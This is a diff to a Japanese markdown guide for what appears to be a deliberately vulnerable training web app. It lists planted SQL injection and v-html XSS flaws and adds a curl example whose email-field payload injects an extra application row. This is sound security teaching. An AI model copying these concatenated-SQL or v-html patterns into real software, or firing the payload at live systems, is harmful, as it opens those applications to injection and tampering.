@@ -5,6 +5,20 @@
 - **変更**: `POST /:id/apply` の INSERT を文字列結合に変更 + 検索用の `GET /:id/applications/search?name=` ルートを追加（文字列結合 SQL）
 - **学習ポイント**: prepared statement vs 文字列結合、OWASP Injection
 
+例: 応募エンドポイント
+```sh
+# メールアドレス欄にSQLインジェクション
+curl -X POST http://localhost:3000/api/events/1/apply \
+  -H "Content-Type: application/json" \
+  -d '{"name": "テスト", "email": "x'\''),(1,'\''攻撃者'\'','\''injected@evil.com"}'
+```
+
+結果として、生成されるSQLは以下のようになり、2回も応募ができてしまう。
+```sh
+INSERT INTO applications (event_id, name, email)
+VALUES (1, 'テスト', 'x'),(1,'攻撃者','injected@evil.com')
+```
+
 ### 1-B. XSS（v-html）
 - **ファイル**: `frontend/src/views/AdminPanel.vue`, `frontend/src/views/LotteryResult.vue`
 - **変更**: 応募者名の表示を `{{ app.name }}` → `v-html="app.name"` に変更。誤解を招くコメント付き（「名前に装飾タグを使えるようにする」）
